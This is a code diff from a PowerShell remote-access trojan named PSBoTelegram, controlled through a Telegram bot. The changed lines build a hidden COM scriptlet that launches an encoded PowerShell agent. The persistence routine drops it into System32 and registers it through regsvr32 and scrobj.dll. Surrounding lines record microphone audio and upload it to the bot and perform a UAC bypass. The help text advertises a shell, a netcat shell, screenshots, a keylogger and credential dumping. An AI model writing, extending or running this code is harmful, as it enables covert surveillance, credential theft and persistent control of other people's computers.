@@ -173,8 +173,28 @@ if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
 if ( (Test-Path $audio) -eq $true) {Remove-Item $audio}
 Get-MicrophoneAudio -Path $audio -Length $segundos -Alias "Secret" 
 bot-send -file $audio -botkey $botkey -chat_id $chat_id
-
 }
+
+function crea_plantilla_sct {param ($code)
+$plantilla_sct = '<?XML version="1.0"?>
+<scriptlet>
+<registration
+description="Win32COMDebug"
+progid="Win32COMDebug"
+version="1.00"
+classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+ >
+ <script language="JScript">
+      <![CDATA[
+           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
+      ]]>
+ </script>
+</registration>
+<public>
+    <method name="Exec"></method>
+</public>
+</scriptlet>'
+return $plantilla_sct}
 
 function BypassUAC-CyberVaca {param ([string]$comando)
 $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta = $env:USERPROFILE + "\appdata\local\temp\1\temp.ps1" ; $comando  | Out-File -Encoding ascii $ruta 
@@ -203,25 +223,7 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
-$plantilla_sct = '<?XML version="1.0"?>
-<scriptlet>
-<registration
-description="Win32COMDebug"
-progid="Win32COMDebug"
-version="1.00"
-classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
- >
- <script language="JScript">
-      <![CDATA[
-           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
-      ]]>
- </script>
-</registration>
-<public>
-    <method name="Exec"></method>
-</public>
-</scriptlet>'
-$plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\log2.sct" 
+$plantilla_sct =  (crea_plantilla_sct -code $code); $plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\log.sct" 
 Add-Registro -code "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\log2.sct scrobj.dll" | out-null ; $texto = ""
 $texto = "Persistencia ejecutada correctamente"} return $texto;break}
 
@@ -269,26 +271,6 @@ if ($Activar -eq "Si") { New-ItemProperty -Path $ruta_key -Name $key -Value "1" 
 if ($Activar -eq "No") {Remove-ItemProperty $ruta_key -Name $key  -Force | Out-Null ; "`n`nEliminada clave de registro, es necesario reiniciar."}
 }
 
-function crea_plantilla_sct {param ($code)
-$plantilla_sct = '<?XML version="1.0"?>
-<scriptlet>
-<registration
-description="Win32COMDebug"
-progid="Win32COMDebug"
-version="1.00"
-classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
- >
- <script language="JScript">
-      <![CDATA[
-           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
-      ]]>
- </script>
-</registration>
-<public>
-    <method name="Exec"></method>
-</public>
-</scriptlet>'
-return $plantilla_sct}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
  $help = "PSBoTelegram V0.8`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz`n[*] /KeyLogger_Selective"
